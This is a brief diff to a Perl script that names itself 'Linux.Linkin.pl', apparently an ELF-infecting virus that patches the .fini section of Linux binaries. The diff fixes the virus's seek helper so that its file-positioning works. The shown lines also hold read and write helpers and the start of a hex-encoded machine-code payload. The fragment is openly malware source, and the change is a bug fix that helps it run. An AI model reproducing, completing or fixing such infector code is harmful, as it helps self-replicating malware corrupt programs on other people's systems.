@@ -1,7 +1,7 @@
 #!/usr/bin/perl
 # Linux.Linkin.pl - patch .fini vx - by isra
 use File::Copy;
-sub r{read$_[0],$x,$_[1];return$x}sub k{seek$_[0],$_[1],"SEEK_SET"}
+sub r{read$_[0],$x,$_[1];return$x}sub k{seek$_[0],$_[1],0}
 sub w{syswrite$_[0],$_[1]}
 $p1="\xe8\x58\x01\x00\x00\x49\x20\x74\x72\x69\x65\x64\x20\x73\x6f\x20\x68\x61".
 "\x72\x64\x20\x61\x6e\x64\x20\x67\x6f\x74\x20\x73\x6f\x20\x66\x61\x72\x2c\x20".
